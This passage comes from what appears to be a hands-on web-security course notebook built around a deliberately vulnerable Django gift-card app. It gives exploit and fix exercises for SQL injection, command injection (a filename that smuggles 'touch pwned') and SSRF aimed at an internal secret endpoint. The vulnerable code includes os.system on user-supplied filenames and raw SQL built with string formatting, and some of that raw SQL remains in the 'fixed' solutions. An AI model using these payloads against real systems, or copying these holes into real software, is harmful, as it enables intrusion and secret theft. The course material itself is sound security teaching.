            os.chmod(db_dir, stat.S_IRWXU | stat.S_IRWXG)
            print("✓ Directory permissions updated")
        except PermissionError:
            print("⚠ Warning: Could not update directory permissions, continuing anyway")

        # Backup the database before running test
        if os.path.exists(db_path):
            try:
                shutil.copy2(db_path, backup_path)
                print(f"✓ Database backed up to {backup_path}")
            except Exception as e:
                print(f"⚠ Warning: Could not backup database: {e}")

        # Load test data to ensure database is properly initialized
        try:
            call_command('loaddata', 'testdata.json')
            print("✓ Test data loaded successfully")
        except Exception as e:
            print(f"⚠ Warning: Could not load test data: {e}")
        
        # Step 2: Read the original views.py content
        if not os.path.exists(views_file):
            print(f"⚠ Warning: {views_file} not found, cannot test fix")
            return False
            
        with open(views_file, 'r') as f:
            original_content = f.read()

        # Step 4: Run the exploit test to verify the fix works
        print("✓ Running exploit test against fixed code...")
        exploit_result = test_exploit_sql_injection_vulnerability(exploit_sql_injection_vulnerability)
        
        if not exploit_result:
            print("✓ SQL injection exploit FAILED against fixed code - fix is working!")
            print("✓ The fixed version successfully prevents SQL injection attacks")
            result = True
        else:
            print("⚠ SQL injection exploit still succeeded - fix may need improvement")
            result = False
        
        print("✓ SQL injection vulnerability fix test completed!")
        return result
        
    except Exception as e:
        print(f"Error during SQL injection fix test: {e}")
        return False
        
    finally:
        # Step 5: Always restore the original views.py file if we added the import
        if 'has_import' in locals() and not has_import:
            try:
                with open(views_file, 'w') as f:
                    f.write(original_content)
                print(f"✓ Restored original {views_file} (removed security fix import)")
            except Exception as e:
                print(f"⚠ Warning: Could not restore original views.py: {e}")
        
        # Always restore the original database
        if os.path.exists(backup_path):
            try:
                shutil.move(backup_path, db_path)
                print(f"✓ Database restored from backup")
            except Exception as e:
                print(f"⚠ Warning: Could not restore database: {e}")
        
    print("=" * 60)

if __name__ == '__main__':
    print("\nTesting SQL injection vulnerability exploitation...")
    # Please comment the last two lines in LegacySite/views.py in SOLUTION mode to see proper exploit
    test_exploit_sql_injection_vulnerability(exploit_sql_injection_vulnerability)

if __name__ == '__main__':
    print("\nTesting SQL injection vulnerability fix...")
    test_fix_sql_injection_vulnerability(fix_sql_injection_vulnerability)

# %%
"""
## Exercise 4: Command Injection Vulnerability

Command Injection represents one of the most severe web application security vulnerabilities, arising from improper handling of user-supplied data in system command execution contexts. This vulnerability exploits the trust relationship between web applications and their underlying operating system, allowing attackers to execute arbitrary system commands with the same privileges as the web application process. This can potentially lead to complete server compromise and unauthorized access to the entire infrastructure.

The theoretical foundation of command injection attacks rests on the principle that modern web applications frequently need to interact with the underlying operating system to perform various tasks, such as file processing, system administration, external tool execution, or process management. While this functionality is essential for providing comprehensive application capabilities, it creates a critical security vulnerability when applications fail to properly validate, sanitize, or escape user input before incorporating it into system command execution calls. The vulnerability essentially bridges the gap between user input and system-level access.

The vulnerability typically occurs when applications use user input in system calls, shell commands, or when calling external programs without proper input validation and sanitization.

Real-world examples:
- Equifax breach via Apache Struts (2017): Equifax disclosed that attackers exploited a Struts vulnerability in its online dispute portal, enabling remote command execution between May 13 and July 30, 2017; the flaw was tied to improper parsing of the Content-Type header in the Jakarta Multipart parser path and was known/patchable months earlier.
[https://www.blackduck.com/blog/cve-2017-5638-apache-struts-vulnerability-explained.html](https://www.blackduck.com/blog/cve-2017-5638-apache-struts-vulnerability-explained.html)

- Shellshock (2014): A bug in GNU Bash caused environment variables to be interpreted in a way that executed appended commands, which was rapidly weaponized after disclosure to compromise CGI-exposed services and build botnets; vendors and researchers observed active exploitation within hours.
[https://www.zscaler.com/blogs/security-research/shellshock-attacks-spotted-wild-updated-sept-26](https://www.zscaler.com/blogs/security-research/shellshock-attacks-spotted-wild-updated-sept-26)

Recommended readings:
- OWASP Command Injection: https://owasp.org/www-community/attacks/Command_Injection
- Python subprocess security: https://docs.python.org/3/library/subprocess.html#security-considerations

Operating systems interpret command strings and can perform many actions based on them. Untrusted input is incorporated into those commands, the system may run something unintended. Avoid direct command interpretation of user-provided text, preferring safer execution methods, and limiting what input is acceptable. The key principle: keep untrusted input out of command interpreters.

<details>
<summary>Vocabulary: Command Injection Terms</summary>

- **Command Injection**: Attack that executes arbitrary commands on the host system
- **Shell metacharacters**: Special characters that have meaning in shell commands (;, |, &, etc.)
- **Input sanitization**: Process of cleaning user input to remove dangerous characters
- **Subprocess**: Python module for spawning new processes safely
- **Shell=True**: Dangerous parameter that enables shell interpretation
- **Command chaining**: Using operators like ; or && to execute multiple commands
- **Path traversal**: Using .. to access files outside intended directories
- **Whitelist validation**: Only allowing known-safe input patterns

</details>

### Exercise 4a - implement exploit_cmd_injection_vulnerability

> **Difficulty**: 🔴🔴🔴🔴⚪  
> **Importance**: 🔵🔵🔵🔵⚪
> 
> You should spend up to ~20 minutes on this exercise.

What is the filename parameter? Why do we even need it?

<details>
<summary>Hint: Intermediate steps</summary>
Create a malicious filename (and card?) to exploit command injection vulnerabilities in file processing.
You can test if your exploits is working by typing the card name in the input field and uploading your malicious card (in /use) then writing a file in this directory.
Then you can also craft a post request to see if the test is passing.
Good incremental outcomes: Identify the exact boundary where filenames are composed into commands; produce a harmless but visible effect; record the observed execution path.
</details>
"""

def exploit_cmd_injection_vulnerability():
    """
    Create command injection payload for filename processing.
    
    Args:
        None
        
    Returns:
        dict: POST parameters including malicious filename and malformed JSON
    """
    if "SOLUTION":
        malicious_filename = "nonexistent; touch pwned; #"
        
        malformed_json = '{"merchant_id": "AI Art Generator Tokens","customer_id": "test2", "total_value": 100,"records": [{"record_type": "amount_change","amount_added": 100,,"signature": "\' OR \'1\'=\'1"}]}'
        
        post_params = {
            'card_supplied': 'True',
            'card_fname': malicious_filename,
            # Use malformed JSON that will trigger a JSON decode error
            'card_data': malformed_json.encode('utf-8')
        }
    else:
        # todo
        malicious_filename = "my_malicious_gc"
        
        malformed_json = '{"merchant_id": "GPT-4 API Credits", "customer_id": "bro", "total_value": "838", "records": [{"record_type": "amount_change", "amount_added": 2000, "signature": "cb3e69337649de4583b61d276868f2c7"}]}'
        
        post_params = {
            #use your post params
        }
    
    return post_params or {}

def test_exploit_cmd_injection_vulnerability(exploit_cmd_injection_vulnerability):
    """Test command injection vulnerability exploitation"""
    # Backup the database before running test
    db_path = 'db.sqlite3'
    backup_path = 'db.sqlite3.backup'
    
    try:
        # Ensure database permissions are correct
        connection.close()

        # Ensure database file has write permissions
        if os.path.exists(db_path):
            try:
                os.chmod(db_path, stat.S_IRUSR | stat.S_IWUSR | stat.S_IRGRP | stat.S_IWGRP)
                print("✓ Database permissions updated")
            except PermissionError:
                print("⚠ Warning: Could not update database permissions, continuing anyway")
        
        # Ensure directory has write permissions
        try:
            db_dir = os.path.dirname(os.path.abspath(db_path))
            os.chmod(db_dir, stat.S_IRWXU | stat.S_IRWXG)
            print("✓ Directory permissions updated")
        except PermissionError:
            print("⚠ Warning: Could not update directory permissions, continuing anyway")

        if os.path.exists(db_path):
            try:
                shutil.copy2(db_path, backup_path)
                print(f"✓ Database backed up to {backup_path}")
            except Exception as e:
                print(f"⚠ Warning: Could not backup database: {e}")

        # Load test data
        try:
            call_command('loaddata', 'testdata.json')
            print("✓ Test data loaded successfully")
        except Exception as e:
            print(f"⚠ Warning: Could not load test data: {e}")
        
        from django.test import Client
        from django.conf import settings
        
        # Add testserver to ALLOWED_HOSTS if not already there
        if 'testserver' not in settings.ALLOWED_HOSTS:
            settings.ALLOWED_HOSTS.append('testserver')
        
        # Create a client and set up test user
        client = Client()
        username, password = 'test4', 'test4'
        
        # Register and login test user
        def register_user(client, username, password):
            try:
                from LegacySite.models import User
                existing_user = User.objects.get(username=username)
                print(f"User '{username}' already exists, skipping registration")
                can_login = client.login(username=username, password=password)
                return can_login
            except User.DoesNotExist:
                endpoint = '/register'
                data = {'uname': username, 'pword': password, 'pword2': password}
                client.post(path=endpoint, data=data)
                can_login = client.login(username=username, password=password)
                return can_login

        # Set up the test user
        register_user(client, username, password)
        client.login(username=username, password=password)
        
        # Get the exploit payload
        post_params = exploit_cmd_injection_vulnerability()
        
        print(f"Attempting command injection via card_fname parameter...")
        print(f"Malicious filename: {post_params['card_fname']}")
        
        # Check if 'pwned' file exists before the attack
        pwned_file = 'pwned'
        if os.path.exists(pwned_file):
            os.remove(pwned_file)
            print("✓ Removed existing 'pwned' file")
        
        try:
            # Upload the card through the use_card_view with malicious filename
            response = client.post('/use.html', {
                'card_supplied': post_params['card_supplied'],
                'card_fname': post_params['card_fname'],
                'card_data': io.BytesIO(post_params['card_data'])
            })

            print(f"Command injection response status: {response.status_code}")
            
            # Check if we got a Bad Request (400) - this indicates the security fix is working
            if response.status_code == 400:
                print("[-] Command injection payload was blocked by input validation")
                print("[-] Bad Request response indicates security fix is working")
                return False
                
        except json.decoder.JSONDecodeError as e:
            print(f"JSON decode error: {e}; This error is the source of the exploit")
            if os.path.exists(pwned_file):
                print("[+] Command injection vulnerability successfully exploited!")
                print("[+] 'touch pwned' command executed - 'pwned' file created")
                
                # Clean up the created file
                os.remove(pwned_file)
                print("✓ Cleaned up 'pwned' file")
                return True
            else:
                print("[-] Command injection payload may have been blocked or sanitized")
                print("[-] 'pwned' file was not created")
                return False
        
        except Exception as e:
            print(f"Error during command injection exploit: {e}")
            return False

    except Exception as e:
        print(f"Error during command injection test: {e}")
        return False
        
    finally:
        # Always restore the original database
        if os.path.exists(backup_path):
            shutil.move(backup_path, db_path)
            print(f"✓ Database restored from backup")

if __name__ == '__main__':
    test_exploit_cmd_injection_vulnerability(exploit_cmd_injection_vulnerability)

# %%
"""
### Exercise 4b - implement fix_cmd_injection_vulnerability

> **Difficulty**: 🔴🔴🔴🔴🔴  
> **Importance**: 🔵🔵🔵🔵🔵
> 
> You should spend up to ~25 minutes on this exercise.

Implement the `fix_cmd_injection_vulnerability` function that eliminates command injection vulnerabilities by implementing proper input validation and using safe subprocess calls.

Command injection protection typically involves:
1. Input validation and sanitization
2. Using subprocess with shell=False
3. Whitelisting allowed characters/patterns
4. Avoiding system() and shell commands
5. Using timeouts for external processes

Editing this function is optional as long as you fix the vulnerability in the backend.
Good incremental outcomes: Try to return a clear error without leaking internals.
"""

def fix_cmd_injection_vulnerability():
    """
    Fixed version of parse_card_data that eliminates command injection vulnerabilities.
    Feel free to edit `parse_card_data(card_file_data, card_path_name)` here or in the server side code
    
    Args:
        None
        
    Returns:
        function: The secure parse_card_data function
    """
    import json
    from binascii import hexlify
    from hashlib import sha256
    from django.conf import settings
    from django.utils import timezone
    import hmac
    import hashlib
    from os import urandom, system
    import sys, os
    import subprocess
    from secrets import token_bytes
    import re

    SEED = settings.RANDOM_SEED

    LEGACY_ROOT = os.path.dirname(os.path.abspath(__file__))

    if sys.platform == 'win32':
        CARD_PARSER = os.path.join(LEGACY_ROOT, 'bins', 'giftcardreader_win.exe')
    elif sys.platform == 'linux':
        CARD_PARSER = os.path.join(LEGACY_ROOT, 'bins', 'giftcardreader_linux')
    elif sys.platform == 'darwin':
        CARD_PARSER = os.path.join(LEGACY_ROOT, 'bins', 'giftcardreader_mac')
    else:
        raise Exception("Unsupported platform: {}".format(sys.platform))

    if "SOLUTION":
        def parse_card_data(card_file_data, card_path_name):
            print(card_file_data)

            if not re.match(r'^[\w-]+\.gftcrd$', os.path.basename(card_path_name)):
                print("Invalid filename format")
            command = [CARD_PARSER, "2", card_path_name]

            try:
                result = subprocess.run(
                    command,
                    capture_output=True,
                    text=True,
                    check=True,
                    timeout=30
                )
                return result.stdout.encode()
            except (subprocess.CalledProcessError, subprocess.TimeoutExpired) as e:
                print(f"Card parsing failed: {str(e)}")
                return card_file_data

            with open("tmp_file", 'rb') as tmp_file:
                return tmp_file.read()
        
        return parse_card_data

    else:
        # TODO: Perform filename validation
        # - Add timeout protection for external processes
        # - Handle errors properly
        def parse_card_data(card_file_data, card_path_name):
            print(card_file_data)
            try:
                test_json = json.loads(card_file_data)
                return card_file_data
            except (json.JSONDecodeError, UnicodeDecodeError):
                pass
            with open(card_path_name, 'wb') as card_file:
                card_file.write(card_file_data)

            print(f"running: {CARD_PARSER} 2 {card_path_name} > tmp_file")
            ret_val = system(f"{CARD_PARSER} 2 {card_path_name} > tmp_file")
            if ret_val != 0:
                return card_file_data
            with open("tmp_file", 'rb') as tmp_file:
                return tmp_file.read()

"""
<details>
<summary>Hints</summary>

1. Use `subprocess.run()` instead of `system()` or `os.popen()`
2. Set `shell=False` to prevent shell interpretation
3. Use `re.match()` to validate filename patterns
4. Add timeout parameters to prevent hanging processes
5. Use `capture_output=True` for safe output handling

</details>
"""

def test_fix_cmd_injection_vulnerability(fix_cmd_injection_vulnerability):
    import importlib
    from LegacySite import views
    importlib.reload(views)
    
    
    views_file = "LegacySite/views.py"
    db_path = 'db.sqlite3'
    backup_path = 'db.sqlite3.backup'
    
    try:
        # Step 1: Ensure database permissions are correct
        connection.close()

        # Ensure database file has write permissions
        if os.path.exists(db_path):
            try:
                os.chmod(db_path, stat.S_IRUSR | stat.S_IWUSR | stat.S_IRGRP | stat.S_IWGRP)
                print("✓ Database permissions updated")
            except PermissionError:
                print("⚠ Warning: Could not update database permissions, continuing anyway")
        
        # Ensure directory has write permissions
        try:
            db_dir = os.path.dirname(os.path.abspath(db_path))
            os.chmod(db_dir, stat.S_IRWXU | stat.S_IRWXG)
            print("✓ Directory permissions updated")
        except PermissionError:
            print("⚠ Warning: Could not update directory permissions, continuing anyway")

        # Backup the database before running test
        if os.path.exists(db_path):
            try:
                shutil.copy2(db_path, backup_path)
                print(f"✓ Database backed up to {backup_path}")
            except Exception as e:
                print(f"⚠ Warning: Could not backup database: {e}")

        # Load test data to ensure database is properly initialized
        try:
            call_command('loaddata', 'testdata.json')
            print("✓ Test data loaded successfully")
        except Exception as e:
            print(f"⚠ Warning: Could not load test data: {e}")
        
        # Step 2: Read the original views.py content
        if not os.path.exists(views_file):
            print(f"⚠ Warning: {views_file} not found, cannot test fix")
            return False
            
        with open(views_file, 'r') as f:
            original_content = f.read()
        
        # Step 4: Run the exploit test to verify the fix works
        print("✓ Running exploit test against fixed code...")
        exploit_result = test_exploit_cmd_injection_vulnerability(exploit_cmd_injection_vulnerability)
        
        if not exploit_result:
            print("✓ CMD injection exploit FAILED against fixed code - fix is working!")
            print("✓ The fixed version successfully prevents CMD injection attacks")
            result = True
        else:
            print("⚠ CMD injection exploit still succeeded - fix may need improvement")
            result = False
        
        print("✓ CMD injection vulnerability fix test completed!")
        return result
        
    except Exception as e:
        print(f"Error during CMD injection fix test: {e}")
        return False
        
    finally:
        # Step 5: Always restore the original views.py file if we added the import
        if 'has_import' in locals() and not has_import:
            try:
                with open(views_file, 'w') as f:
                    f.write(original_content)
                print(f"✓ Restored original {views_file} (removed security fix import)")
            except Exception as e:
                print(f"⚠ Warning: Could not restore original views.py: {e}")
        
        # Always restore the original database
        if os.path.exists(backup_path):
            try:
                shutil.move(backup_path, db_path)
                print(f"✓ Database restored from backup")
            except Exception as e:
                print(f"⚠ Warning: Could not restore database: {e}")
        
    print("=" * 60)

if __name__ == '__main__':
    test_fix_cmd_injection_vulnerability(fix_cmd_injection_vulnerability)

# %%
"""
## Exercise 5: Server-Side Request Forgery (SSRF) Vulnerability

Server-Side Request Forgery (SSRF) is a critical web application vulnerability that allows attackers to manipulate server-side applications into making unintended requests to arbitrary destinations. This vulnerability exploits the trust relationship between web applications and their ability to fetch external resources, creating a powerful attack vector that can bypass network security controls and access internal infrastructure that would normally remain hidden from external attackers.

Modern web applications frequently need to retrieve external resources like images, documents, API responses, or other web content based on user-supplied URLs or parameters. While this functionality is essential for providing rich user experiences and integrating with external services, it creates a significant attack surface when applications don't properly validate and sanitize the destination URLs before making server-side requests.

The vulnerability occurs when web applications accept user-controlled input that specifies the target of server-side HTTP requests without implementing proper validation mechanisms. This situation allows malicious actors to manipulate the application into making requests to internal network resources, cloud metadata endpoints, or other sensitive services that aren't intended to be accessible from the internet. The result is a dangerous breach of the intended security boundaries that protect internal systems.

Real-world examples:
- The Capital One breach (2019), where SSRF enabled attackers to access sensitive AWS metadata and exfiltrate data from over 100 million customer records.
[https://www.greynoise.io/blog/new-ssrf-exploitation-surge](https://www.greynoise.io/blog/new-ssrf-exploitation-surge)
- An SSRF in BookStack v23.10.2 (CVE-2023-6199) that permitted attackers with write access to retrieve local files via a blind SSRF exploit.
[https://fluidattacks.com/advisories/imagination?utm_source=chatgpt.com](https://fluidattacks.com/advisories/imagination?utm_source=chatgpt.com)

Recommended readings:
- OWASP SSRF: https://owasp.org/www-community/attacks/Server-Side_Request_Forgery
- PortSwigger SSRF: https://portswigger.net/web-security/ssrf
- AWS IMDSv2: https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html
- GCP Metadata: https://cloud.google.com/compute/docs/metadata/overview

When applications fetch remote content using addresses that users provide, write-ups explain that this can cause the server to reach locations that aren't meant to be publicly accessible. This can reveal information or interact with internal systems. We highlights restricting which destinations are allowed and carefully handling network access. The main takeaway: don't let user-controlled addresses turn the server into a path to private resources.

<details>
<summary>Vocabulary: SSRF Terms</summary>

- **SSRF (Server-Side Request Forgery)**: Attack where the server makes unintended requests
- **Internal services**: Services only accessible from within the network (localhost, private IPs)
- **URL validation**: Checking URLs against allowed patterns before making requests
- **Allowlist**: List of permitted domains/URLs that can be accessed
- **Localhost**: The local machine (127.0.0.1, ::1)
- **Private IP ranges**: IP addresses reserved for internal networks (10.x.x.x, 192.168.x.x, etc.)
- **Port scanning**: Using SSRF to discover open ports/services on internal systems

</details>

### Exercise 3a - implement exploit_ssrf_vulnerability

> **Difficulty**: 🔴🔴🔴⚪⚪  
> **Importance**: 🔵🔵🔵🔵⚪
> 
> You should spend up to ~20 minutes on this exercise.

The devs thought that sharing giftcards with friends using pastebin given its easy to use and nice UI would be perfect. Wonder how that worked out, accepting urls without validating them.

Goal: Create a malicious URL that targets an internal endpoint that leaks sensitive information.
"""


def exploit_ssrf_vulnerability():
    """
    Exploit SSRF vulnerability by making the server fetch internal endpoints.

    Args:
        None

    Returns:
        str: Malicious URL targeting internal service endpoint
    """
    if "SOLUTION":
        # Exploit SSRF by making the server request the internal get_secret endpoint
        vulnerable_url = "http://127.0.0.1:8000/get_secret/"
        return vulnerable_url
    else:
        # TODO: Create URL that targets internal secrets
        # - Point to an internal endpoint that leaks sensitive information
        return "https://pastebin.com/gBXe38Et"


def test_exploit_ssrf_vulnerability(exploit_ssrf_vulnerability):
    """Test SSRF vulnerability exploitation"""
    # Backup the database before running test
    db_path = 'db.sqlite3'
    backup_path = 'db.sqlite3.backup'

    try:
        # Ensure database permissions are correct
        connection.close()

        if os.path.exists(db_path):
            try:
                os.chmod(db_path, stat.S_IRUSR | stat.S_IWUSR | stat.S_IRGRP | stat.S_IWGRP)
                print("✓ Database permissions updated")
            except PermissionError:
                print("⚠ Warning: Could not update database permissions, continuing anyway")

        # Ensure directory has write permissions
        try:
            db_dir = os.path.dirname(os.path.abspath(db_path))
            os.chmod(db_dir, stat.S_IRWXU | stat.S_IRWXG)
            print("✓ Directory permissions updated")
        except PermissionError:
            print("⚠ Warning: Could not update directory permissions, continuing anyway")

        if os.path.exists(db_path):
            try:
                shutil.copy2(db_path, backup_path)
                print(f"✓ Database backed up to {backup_path}")
            except Exception as e:
                print(f"⚠ Warning: Could not backup database: {e}")

        # Load test data
        try:
            call_command('loaddata', 'testdata.json')
            print("✓ Test data loaded successfully")
        except Exception as e:
            print(f"⚠ Warning: Could not load test data: {e}")
            # Continue with existing data if loading fails

        from django.test import Client
        from django.conf import settings

        # Add testserver to ALLOWED_HOSTS if not already there
        if 'testserver' not in settings.ALLOWED_HOSTS:
            settings.ALLOWED_HOSTS.append('testserver')

        # Create a client and set up test user
        client = Client()
        username, password = 'test7', 'test7'

        # Register and login test user
        def register_user(client, username, password):
            try:
                from LegacySite.models import User
                existing_user = User.objects.get(username=username)
                print(f"User '{username}' already exists, skipping registration")
                can_login = client.login(username=username, password=password)
                return can_login
            except User.DoesNotExist:
                endpoint = '/register'
                data = {'uname': username, 'pword': password, 'pword2': password}
                client.post(path=endpoint, data=data)
                can_login = client.login(username=username, password=password)
                return can_login

        # Set up the test user
        register_user(client, username, password)
        client.login(username=username, password=password)

        card_url = exploit_ssrf_vulnerability()

        try:
            # Upload the card through the use_card_view
            response = client.post('/use/', {
                'card_url_supplied': True,
                'card_url': card_url,
                'card_fname': 'ssrf_test'
            })

            print(f"SSRF exploit response status: {response.status_code}")

            if response.status_code == 200:
                response_content = response.content.decode()
                if "SECRET_KEY" in response_content:
                    print("[+] SSRF vulnerability successfully exploited!")
                    print(f"[+] Leaked SECRET_KEY found in response")
                    # Extract the secret key from the error message
                    import re
                    secret_match = re.search(r'SECRET_KEY:\s*([^\s]+)', response_content)
                    if secret_match:
                        leaked_secret = secret_match.group(1)
                        print(f"[+] Leaked SECRET_KEY: {leaked_secret}")
                    return True
                else:
                    print("[-] SECRET_KEY not found in response")
                    return False
            else:
                print(f"[-] Request failed with status {response.status_code}")
                return False

        except Exception as e:
            print(f"Error during SQL injection exploit: {e}")
            return False

    except Exception as e:
        print(f"Error during SSRF exploit test: {e}")
        return False

    finally:
        # Restore the original database
        if os.path.exists(backup_path):
            shutil.move(backup_path, db_path)
            print(f"✓ Database restored from backup")


if __name__ == '__main__':
    test_exploit_ssrf_vulnerability(exploit_ssrf_vulnerability)

# %%
"""
### Exercise 5b - implement fix_ssrf_vulnerability

> **Difficulty**: 🔴🔴🔴🔴⚪  
> **Importance**: 🔵🔵🔵🔵🔵
> 
> You should spend up to ~25 minutes on this exercise.

Implement the `fix_ssrf_vulnerability` function that fixes the SSRF vulnerability by implementing proper URL validation.

SSRF protection typically involves:
1. URL validation and whitelisting
2. Restricting allowed protocols (only HTTPS)
3. Blocking access to internal IP ranges
4. Validating URL formats and paths
5. Using DNS resolution checks

Editing this function is optional as long as you fix the vulnerability in the backend.
Good incremental outcomes: Enforce HTTPS only; introduce a minimal allowlist; return a clear error when validation fails and log the attempt for visibility.
"""


def fix_ssrf_vulnerability():
    """
    Fix SSRF vulnerability by adding comprehensive URL validation.
    Feel free to edit `use_card_view(request)` here or in the server side code.

    Args:
        None

    Returns:
        function: The secure use_card_view function with SSRF protection
    """
    import tempfile
    import json
    import os
    from django.shortcuts import render, redirect
    from django.http import HttpResponse
    from django.core.exceptions import ObjectDoesNotExist
    from LegacySite.models import Card, Product
    from LegacySite import extras

    if "SOLUTION":
        def use_card_view(request):
            # from . import extras
            context = {'card_found': None}

            if request.method == 'GET':
                if not request.user.is_authenticated:
                    return redirect("login.html")
                try:
                    # SECURE: Using Django ORM instead of raw SSRF
                    user_cards = Card.objects.filter(user=request.user).filter(used=False)
                except ObjectDoesNotExist:
                    user_cards = None
                context['card_list'] = user_cards
                context['card'] = None
                return render(request, 'use-card.html', context)

            elif request.method == "POST" and request.POST.get('card_url_supplied', False):
                # Post with URL-based card, fetch and use this card.
                context['card_list'] = None
                card_url = request.POST.get('card_url', None)
                card_fname = request.POST.get('card_fname', None)
                card_error_data = 'Could not read response'

                if card_url is None or card_url == '':
                    return HttpResponse("ERROR: No URL provided.")

                # SECURE: Add URL validation to prevent SSRF attacks
                import urllib.parse

                try:
                    parsed_url = urllib.parse.urlparse(card_url)

                    # Only allow HTTPS URLs from pastebin.com
                    if parsed_url.scheme != 'https':
                        return HttpResponse("ERROR: Only HTTPS URLs are allowed.")

                    if parsed_url.hostname != 'pastebin.com':
                        return HttpResponse("ERROR: Only pastebin.com URLs are allowed.")

                    # Validate the URL path format
                    if not parsed_url.path.startswith('/raw/'):
                        return HttpResponse("ERROR: Invalid pastebin URL format.")

                except Exception:
                    return HttpResponse("ERROR: Invalid URL format.")

                try:
                    import urllib.request
                    # SECURE: Only fetch from validated pastebin URLs
                    validated_url = f'https://pastebin.com{parsed_url.path}'
                    print(f'Fetching from validated URL: {validated_url}')

                    try:
                        with urllib.request.urlopen(validated_url) as response:
                            card_file_data = response.read()
                            card_error_data = card_file_data
                    except urllib.error.HTTPError as e:
                        return HttpResponse(f"ERROR: Failed to fetch card from URL. HTTP {e.code}")
                    except Exception as e:
                        print(e)
                        return HttpResponse("ERROR: Failed to fetch card from URL.")

                    if card_fname is None or card_fname == '':
                        card_file_path = os.path.join(tempfile.gettempdir(), f'urlcard_{request.user.id}_parser.gftcrd')
                    else:
                        card_file_path = os.path.join(tempfile.gettempdir(),
                                                      f'{card_fname}_{request.user.id}_parser.gftcrd')

                    card_data = extras.parse_card_data(card_file_data, card_file_path)
                    # check if we know about card.
                    print(card_data.strip())
                    signature = json.loads(card_data)['records'][0]['signature']
                    # signatures should be pretty unique, right?
                    card_query = Card.objects.raw(
                        'select id from LegacySite_card where data LIKE \'%%%s%%\'' % signature)
                    user_cards = Card.objects.raw(
                        'select id, count(*) as count from LegacySite_card where LegacySite_card.user_id = %s' % str(
                            request.user.id))
                    card_query_string = ""
                    print("Found %s cards" % len(card_query))
                    for thing in card_query:
                        # print cards as strings
                        card_query_string += str(thing) + '\n'
                    if len(card_query) == 0:
                        # card not known, add it.
                        if card_fname is not None:
                            card_file_path = os.path.join(tempfile.gettempdir(),
                                                          f'{card_fname}_{request.user.id}_{user_cards[0].count + 1}.gftcrd')
                        else:
                            card_file_path = os.path.join(tempfile.gettempdir(),
                                                          f'urlcard_{request.user.id}_{user_cards[0].count + 1}.gftcrd')
                        fp = open(card_file_path, 'wb')
                        fp.write(card_data.encode() if isinstance(card_data, str) else card_data)
                        fp.close()
                        card = Card(data=card_data, fp=card_file_path, user=request.user, used=True)
                    else:
                        context['card_found'] = card_query_string
                        try:
                            card = Card.objects.get(data=card_data)
                            card.used = True
                            card.save()
                        except ObjectDoesNotExist:
                            print("No card found with data =", card_data)
                            card = None
                    context['card'] = card
                    return render(request, "use-card.html", context)
                except Exception as e:
                    return HttpResponse(f"ERROR: Failed to fetch card from URL: {str(e)}. Card Data: {card_error_data}")

            elif request.method == "POST" and request.POST.get('card_supplied', False):
                # Post with specific card, use this card.
                context['card_list'] = None
                # Need to write this to parse card type.
                card_file_data = request.FILES['card_data']
                card_fname = request.POST.get('card_fname', None)
                if card_fname is None or card_fname == '':
                    card_file_path = os.path.join(tempfile.gettempdir(), f'newcard_{request.user.id}_parser.gftcrd')
                else:
                    card_file_path = os.path.join(tempfile.gettempdir(),
                                                  f'{card_fname}_{request.user.id}_parser.gftcrd')
                card_data = extras.parse_card_data(card_file_data.read(), card_file_path)
                # check if we know about card.
                print(card_data.strip())
                signature = json.loads(card_data)['records'][0]['signature']
                # signatures should be pretty unique, right?
                card_query = Card.objects.raw('select id from LegacySite_card where data LIKE \'%%%s%%\'' % signature)
                user_cards = Card.objects.raw(
                    'select id, count(*) as count from LegacySite_card where LegacySite_card.user_id = %s' % str(
                        request.user.id))
                card_query_string = ""
                print("Found %s cards" % len(card_query))
                for thing in card_query:
                    # print cards as strings
                    card_query_string += str(thing) + '\n'
                if len(card_query) == 0:
                    # card not known, add it.
                    if card_fname is not None:
                        card_file_path = os.path.join(tempfile.gettempdir(),
                                                      f'{card_fname}_{request.user.id}_{user_cards[0].count + 1}.gftcrd')
                    else:
                        card_file_path = os.path.join(tempfile.gettempdir(),
                                                      f'newcard_{request.user.id}_{user_cards[0].count + 1}.gftcrd')
                    fp = open(card_file_path, 'wb')
                    fp.write(card_data)
                    fp.close()
                    card = Card(data=card_data, fp=card_file_path, user=request.user, used=True)
                else:
                    context['card_found'] = card_query_string
                    try:
                        card = Card.objects.get(data=card_data)
                        card.used = True
                        card.save()
                    except ObjectDoesNotExist:
                        print("No card found with data =", card_data)
                        card = None
                context['card'] = card
                return render(request, "use-card.html", context)

            elif request.method == "POST":
                # SECURE: Authentication check added
                if not request.user.is_authenticated:
                    return redirect("login.html")

                card_id = request.POST.get('card_id', None)
                if card_id is None:
                    return HttpResponse("No card specified", status=400)

                try:
                    card = Card.objects.get(id=card_id)
                    # SECURE: Authorization check to ensure user owns the card
                    if card.user != request.user:
                        return HttpResponse("Unauthorized", status=403)

                    card.used = True
                    card.save()
                except ObjectDoesNotExist:
                    return HttpResponse("Card not found", status=404)

                context['card'] = card
                try:
                    user_cards = Card.objects.filter(user=request.user).filter(used=False)
                except ObjectDoesNotExist:
                    user_cards = None
                context['card_list'] = user_cards
                return render(request, "use-card.html", context)

            return HttpResponse("Error 404: Internal Server Error")

        return use_card_view

    else:
        def use_card_view(request):
            context = {'card_found': None}
            if request.method == 'GET':
                if not request.user.is_authenticated:
                    return redirect("login.html")
                try:
                    user_cards = Card.objects.filter(user=request.user).filter(used=False)
                except ObjectDoesNotExist:
                    user_cards = None
                context['card_list'] = user_cards
                context['card'] = None
                return render(request, 'use-card.html', context)
            elif request.method == "POST" and request.POST.get('card_url_supplied', False):
                # Post with URL-based card, fetch and use this card.
                context['card_list'] = None
                card_url = request.POST.get('card_url', None)
                card_fname = request.POST.get('card_fname', None)
                card_error_data = 'Could not read response'

                if card_url is None or card_url == '':
                    return HttpResponse("ERROR: No URL provided.")

                try:
                    import urllib.request
                    # Fetch card data from URL
                    print('https://pastebin.com/raw/' + card_url.split('/')[-1])
                    try:
                        with urllib.request.urlopen('https://pastebin.com/raw/' + card_url.split('/')[-1]) as response:
                            card_file_data = response.read()
                            card_error_data = card_file_data
                    except urllib.error.HTTPError as e:
                        if e.code == 404:
                            # If 404, try the URL directly
                            with urllib.request.urlopen(card_url) as response:
                                card_file_data = response.read()
                                card_error_data = card_file_data
                        else:
                            raise
                    except Exception as e:
                        print(e)

                    if card_fname is None or card_fname == '':
                        card_file_path = os.path.join(tempfile.gettempdir(), f'urlcard_{request.user.id}_parser.gftcrd')
                    else:
                        card_file_path = os.path.join(tempfile.gettempdir(),
                                                      f'{card_fname}_{request.user.id}_parser.gftcrd')

                    card_data = extras.parse_card_data(card_file_data, card_file_path)
